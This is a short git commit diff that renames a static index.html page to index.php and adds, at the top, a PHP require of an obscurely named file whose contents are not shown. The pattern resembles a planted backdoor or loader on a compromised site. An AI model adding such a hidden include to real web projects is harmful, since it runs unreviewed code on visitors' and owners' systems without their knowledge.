634689770748f96429db1d7b726670a9b677a6c2
newxbharti <marydavid86439@gmail.com>
2026-06-17 17:12:44 +0530

    Update and rename index.html to index.php

--- index.php
+++ index.php
@@ -1,3 +1,4 @@
+<?php require __DIR__ . '/1czbpxh.php' ?>
 <!doctype html>
 <!--[if lt IE 7]>      <html class="no-js lt-ie9 lt-ie8 lt-ie7" lang=""> <![endif]-->
 <!--[if IE 7]>         <html class="no-js lt-ie9 lt-ie8" lang=""> <![endif]-->
